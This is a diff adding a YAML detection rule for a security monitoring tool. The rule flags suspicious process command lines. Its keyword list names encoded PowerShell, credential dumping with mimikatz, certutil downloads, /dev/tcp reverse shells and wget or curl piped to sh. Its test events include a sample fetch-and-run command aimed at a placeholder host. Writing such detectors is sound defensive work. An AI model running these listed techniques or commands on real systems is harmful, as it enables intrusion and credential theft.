@@ -1,0 +1,38 @@
+id: suspicious-command
+title: Suspicious command line
+status: stable
+level: medium
+author: MiniSOC
+description: Command line or script matched a watch-list (encoded PowerShell, download-and-execute, credential dumping, reverse shells).
+logsource: {category: process}
+mitre: [T1059.001, T1059.004, T1105, T1003]
+detection:
+  keywords:
+    - "-encodedcommand"
+    - " -enc "
+    - frombase64string
+    - downloadstring
+    - mimikatz
+    - sekurlsa
+    - "certutil -urlcache"
+    - "/dev/tcp/"
+    - "chmod 777 /tmp"
+    - "wget http"
+    - "curl http"
+    - "| sh"
+  exclude:
+    event_type: [WebAttack, WebRequest, ExploitAttempt, IntrusionEvent]
+  condition: keywords and not exclude
+risk:
+  - {entity: host, score: 40}
+  - {entity: username, score: 20}
+message: "Suspicious command on {host} by {username}: {details}"
+tests:
+  - name: encoded powershell matches
+    expect: match
+    events:
+      - {event_type: ProcessStart, host: WS-01, username: bob, details: "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA"}
+  - name: attack pattern inside a blocked web request is excluded
+    expect: no_match
+    events:
+      - {event_type: WebAttack, details: "GET /x?cmd=wget http://x/y.sh | sh"}
